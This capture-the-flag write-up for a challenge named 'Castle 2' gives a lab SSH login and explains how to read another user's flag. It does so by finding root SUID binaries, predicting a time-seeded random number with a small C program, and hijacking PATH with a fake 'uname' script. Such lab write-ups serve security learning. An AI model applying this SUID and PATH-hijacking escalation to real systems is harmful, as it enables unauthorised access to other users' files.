# Castle 2
After solving Castle 1, recover the flag2.txt file from the same system Note: Flag is not in the usual format

## Writeup
1. ssh harry@castle.runcode.ninja with password `wingardiumleviosa123`

2. flag2.txt should be in `/home/hermonine`.

3. Search for user root's SUID binary with `find / -user root -perm -u=s -exec ls -al {} \; 2> /dev/null`, we get `/usr/sbin/swagger` with the closest last modification date.

4. Reverse it, it is a x64 elf running `srand(time(NULL))`, and we need to find the first random number. If we do, we can get `uname -p` executed as `hermonine`.

5. Wrote a program get_rand.c
```
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
void main() {
    int a;
    srand(time(NULL));
    a = rand();
    printf("%d", a);
}
```
compile it with `gcc -o get_rand get_rand.c`.

6. Make a shell script named `uname`
```
#!/bin/sh

cat /home/hermonine/flag2.txt
```
Add our directory to the environment variable `export PATH=/tmp/c:$PATH`

7. Create another script `run.sh`
```
#!/bin/sh

./get_rand
/usr/sbin/swagger
```

8. Execute `run.sh`, we get the target number first, and the `uname` shell script will be executed after we copy and paste the number, we get the flag.